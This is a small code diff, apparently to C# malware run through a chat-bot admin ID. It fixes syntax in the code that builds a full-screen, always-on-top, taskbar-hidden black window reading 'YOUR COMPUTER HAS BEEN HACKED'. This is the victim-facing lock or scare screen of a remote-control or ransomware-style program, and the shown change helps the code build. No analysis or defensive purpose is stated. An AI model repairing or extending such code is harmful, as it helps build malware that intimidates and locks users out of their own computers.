@@ -1569,7 +1569,7 @@ static long adminChatId = {{ADMIN_ID}};
             {
                 Text = "YOUR COMPUTER HAS BEEN HACKED",
                 Font = new Font("Arial", 40, FontStyle.Bold),
-                ForeColor = System.Drawing.Color.White
+                ForeColor = System.Drawing.Color.White,
                 Dock = DockStyle.Fill,
                 TextAlign = ContentAlignment.MiddleCenter
             };
@@ -1739,8 +1739,8 @@ static long adminChatId = {{ADMIN_ID}};
                         WindowState = FormWindowState.Maximized,
                         TopMost = true,
                         ShowInTaskbar = false,
-                        BackColor = System.Drawing.Color.Black
-TransparencyKey = System.Drawing.Color.Black
+                        BackColor = System.Drawing.Color.Black,
+TransparencyKey = System.Drawing.Color.Black,
                         Opacity = 0.99
                     };
 
